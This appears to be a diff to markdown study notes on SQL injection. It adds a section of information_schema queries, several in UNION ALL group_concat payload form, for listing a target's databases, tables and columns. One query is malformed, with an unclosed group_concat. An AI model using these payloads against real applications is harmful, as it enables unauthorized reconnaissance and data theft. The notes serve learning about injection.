@@ -37,6 +37,32 @@ Where the injection happens within the program statement matters on forming an c
 
 ## Out of band SQLi
 
+
+## Enumerate Database
+
+Get database names
+```sql
+SELECT schema_name FROM information_schema.schemata
+UNION ALL SELECT group_concat(schema_name) FROM information_schema.schemata
+```
+
+
+Get table names
+```sql
+SELECT table_name FROM information_schema.tables WHERE table_schema = "database_name"
+UNION ALL SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='database1'
+```
+[Find Tables Names](https://www.sqlinjection.net/table-names/)
+
+
+Get column names
+```sql
+SELECT column_name FROM information_schema.columns WHERE table_name = "table_name"
+SELECT group_concat(table_name, ":", column_name FROM information_schema.columns WHERE table_schema = "database_name"
+UNION ALL SELECT group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='table1'
+```
+[Find Column Names](https://www.sqlinjection.net/column-names/)
+
 ## Prevention
 
 ## References
